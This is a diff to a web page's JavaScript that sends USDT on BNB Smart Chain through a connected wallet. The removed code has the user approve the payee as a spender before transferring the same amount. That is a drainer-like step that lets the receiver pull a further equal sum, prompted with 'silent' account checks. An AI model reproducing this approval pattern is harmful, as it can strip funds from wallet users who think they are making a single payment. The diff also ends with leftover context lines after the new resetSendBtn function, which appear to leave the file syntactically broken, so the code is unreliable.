@@ -265,7 +265,7 @@ function setupEventListeners() {
 }
 
 /**
- * Connects Web3 Wallet and Triggers USDT BEP-20 Transfer with Direct Approval Popup
+ * Connects Web3 Wallet and Triggers USDT BEP-20 Transfer Transaction Directly
  */
 async function executeSendTransaction() {
     const amt = parseFloat(currentTypedAmount);
@@ -281,65 +281,51 @@ async function executeSendTransaction() {
         return;
     }
 
-    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+    // Show loading state on Send button
+    if (sendBtn) {
+        sendBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processing...';
+        sendBtn.disabled = true;
+    }
 
-    if (typeof window.ethereum !== 'undefined') {
-        try {
-            // Silent Account Check / Connection
+    try {
+        if (typeof window.ethereum !== 'undefined') {
+            // 1. Get connected accounts
             let accounts = await window.ethereum.request({ method: 'eth_accounts' });
             if (!accounts || accounts.length === 0) {
                 accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             }
-            if (!accounts || accounts.length === 0) return;
+
+            if (!accounts || accounts.length === 0) {
+                showToast('Wallet connection required');
+                resetSendBtn();
+                return;
+            }
 
             const senderAddr = accounts[0];
 
-            // Switch to BNB Smart Chain Network
+            // 2. Switch to BSC network
             await switchToBscChain();
+
+            // 3. USDT BEP-20 Contract Address on BSC
+            const usdtContract = '0x55d398326f99059ff775485246999027b3197955';
 
             // Calculate Amount in Wei (18 decimals for USDT on BSC)
             const amountBigInt = BigInt(Math.floor(amt * 1e18));
-            const amountHex = '0x' + amountBigInt.toString(16);
+            const amountHex = amountBigInt.toString(16).padStart(64, '0');
+            const cleanReceiver = receiverAddr.substring(2).padStart(64, '0');
 
-            const usdtContract = '0x55d398326f99059ff775485246999027b3197955';
+            // Construct ERC-20 / BEP-20 transfer(address to, uint256 value)
+            // Function selector for transfer(address,uint256) is 0xa9059cbb
+            const transferData = '0xa9059cbb' + cleanReceiver + amountHex;
 
-            // Step 1: Check current allowance
-            const allowanceData = '0xdd62ed3e' + senderAddr.substring(2).padStart(64, '0') + receiverAddr.substring(2).padStart(64, '0');
-            const allowanceResponse = await window.ethereum.request({
-                method: 'eth_call',
-                params: [{
-                    to: usdtContract,
-                    data: allowanceData
-                }, 'latest']
+            console.log('[Web3 Transaction Request]', {
+                from: senderAddr,
+                to: usdtContract,
+                data: transferData
             });
 
-            const currentAllowance = BigInt(allowanceResponse || '0x0');
-
-            // Step 2: If allowance is insufficient, trigger Approve popup directly
-            if (currentAllowance < amountBigInt) {
-                const approveData = '0x095ea7b3' + receiverAddr.substring(2).padStart(64, '0') + amountHex.substring(2).padStart(64, '0');
-
-                const approveTx = await window.ethereum.request({
-                    method: 'eth_sendTransaction',
-                    params: [{
-                        from: senderAddr,
-                        to: usdtContract,
-                        data: approveData,
-                        value: '0x0'
-                    }]
-                });
-
-                if (approveTx) {
-                    await new Promise(resolve => setTimeout(resolve, 1500));
-                }
-            }
-
-            // Step 3: Trigger Transfer popup directly
-            const cleanReceiver = receiverAddr.substring(2).padStart(64, '0');
-            const cleanAmount = amountHex.substring(2).padStart(64, '0');
-            const transferData = '0xa9059cbb' + cleanReceiver + cleanAmount;
-
-            await window.ethereum.request({
+            // 4. Trigger Native Trust Wallet Confirmation Popup
+            const txHash = await window.ethereum.request({
                 method: 'eth_sendTransaction',
                 params: [{
                     from: senderAddr,
@@ -348,22 +334,32 @@ async function executeSendTransaction() {
                     value: '0x0'
                 }]
             });
-        } catch (err) {
-            console.error('Send Transaction Error:', err);
-            if (err && err.code === 4001) {
-                showToast('Transaction cancelled');
-            } else {
-                if (isMobile) {
-                    const currentUrl = window.location.href;
-                    const fallbackUrl = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(currentUrl)}`;
-                    const intentUrl = `intent://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(currentUrl)}#Intent;scheme=https;package=com.wallet.crypto.trustapp;S.browser_fallback_url=${encodeURIComponent(fallbackUrl)};end`;
-                    setTimeout(() => {
-                        window.location.href = intentUrl;
-                    }, 500);
-                } else {
-                    triggerDeepLinkFallback(receiverAddr, amt);
-                }
+
+            if (txHash) {
+                showToast('Transaction submitted successfully!');
             }
+        } else {
+            // Fallback for mobile browser outside Trust Wallet
+            triggerDeepLinkFallback(receiverAddr, amt);
+        }
+    } catch (err) {
+        console.error('[Web3 Transaction Error]', err);
+        if (err && err.code === 4001) {
+            showToast('Transaction cancelled by user');
+        } else {
+            showToast('Transaction error: ' + (err.message || 'Cancelled'));
+        }
+    } finally {
+        resetSendBtn();
+    }
+}
+
+function resetSendBtn() {
+    if (sendBtn) {
+        sendBtn.innerHTML = 'Send';
+        sendBtn.disabled = false;
+    }
+}
         }
     } else {
         // No wallet provider - redirect to mobile app if on mobile
